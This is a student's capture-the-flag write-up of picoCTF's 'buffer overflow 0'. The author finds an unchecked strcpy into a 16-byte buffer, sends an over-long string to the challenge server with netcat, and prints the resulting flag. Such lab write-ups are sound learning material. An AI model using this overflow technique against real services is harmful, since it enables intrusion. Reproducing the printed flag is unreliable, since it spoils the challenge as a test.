# 1. buffer overflow 0
This challenge involves exploiting a buffer overflow vulnerability in a given program. We are also given access to the source code, which helps in understanding how the buffer is handled and where the vulnerability lies.

## Solution:
1. First I received the two files: `vuln` and `vuln.c`. I opened vuln.c with vim to understand how the program works. Reading the source code - I noticed that it asks for a flag.txt file. Nothing was understandable from that.
2. So I tried running the `vuln` program directly. So I changed its permissions to make it executable.
3. It prompted for input, but I was not sure what to input yet.
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ chmod +x vuln

    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ ./vuln
    Please create 'flag.txt' in this directory with your own debugging flag.
    ```
4. Next, I connected to the challenge server via netcat using `nc saturn.picoctf.net 54577`. The server takes input so I gave - "Input: 93874" and then printed "The program will exit now."
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ nc saturn.picoctf.net 54577
    Input: 93874
    ```
5. I was not able to figure out. I tried reading the code again.
6. I reviewed the source code again, focusing on functions like `strcpy` and `gets` - which are known to be unsafe as they dont perform bounds checking(I got to know in PPS class). I saw that `strcpy(buf2, input)` was used, and `buf2` had a fixed size of 16 bytes.
7. So I prepared an input string longer than 16 characters to overflow `buf2`.
8. I made the previous command run again and wrote any random string greater than 16. This caused the program to respond with the flag:
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ nc saturn.picoctf.net 54577
    Input: 039485704398732094873409873294870987534987
    picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
    ```

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:
- Understanding how buffer overflows work and how unsafe functions like `strcpy` and `gets` can be exploited.

## Notes:
- I was initially trying to create a random flag file, but since the title was overflow i resisted it and started thinking the other way.
- I also thought about using `gdb` to analyze the binary and after doing a little came back.

## Resources:
- Only Google to get some search about strcpy.
- Later when I opened hint the `man gets` and under that BUGS section was stated.
